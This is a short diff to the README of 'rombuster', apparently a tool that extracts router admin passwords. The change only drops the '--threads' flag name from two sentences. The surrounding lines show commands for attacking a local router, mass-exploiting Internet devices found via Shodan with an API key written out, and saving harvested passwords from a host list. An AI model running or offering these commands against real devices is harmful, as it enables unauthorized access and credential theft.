@@ -53,7 +53,7 @@ rombuster -a 192.168.2.1
 [i] (192.168.2.1) - password: SuperHardPassword999
 ```
 
-Let's try to use Shodan search engine to exploit devices over Internet, we will use it with `-t` or `--threads` for fast exploitation.
+Let's try to use Shodan search engine to exploit devices over Internet, we will use it with `-t` for fast exploitation.
 
 ```shell
 rombuster -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD
@@ -83,7 +83,7 @@ rombuster -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD
 [i] Thread #2 completed.
 ```
 
-Let's try to use opened database of hosts with `-t` or `--threads` for fast exploitation.
+Let's try to use opened database of hosts with `-t` for fast exploitation.
 
 ```shell
 rombuster -t -i devices.txt -o passwords.txt
